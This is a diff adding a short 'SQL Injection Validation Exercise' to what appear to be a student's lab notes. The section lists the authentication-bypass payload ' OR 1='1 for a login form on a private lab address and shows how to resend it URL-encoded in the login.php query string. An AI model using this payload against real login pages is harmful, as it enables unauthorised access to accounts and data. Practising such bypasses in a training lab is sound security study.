@@ -38,4 +38,29 @@ databse
 tables
 columns 
 
+----------------------------------------------------------------------------------------------------------
+
+  SQL Injection Validation Exercise ()
+http://10.50.36.14
+
+```
+' OR 1='1
+```
+* insert both into the input fileds:
+  - User:
+  - Pass:
+
+* Inspect the page
+  - Network
+    - POST request
+      - Request
+
+* Append the the value in the request filed to the end of the URL:
+  ex:
+```
+  http://10.50.36.14/login.php
+  + username=%27+OR+1+%3D%271&passwd=%27+OR+1+%3D%271
+  so...
+ http://10.50.36.14/login.php?username=%27+OR+1+%3D%271&passwd=%27+OR+1+%3D%271
+```
 
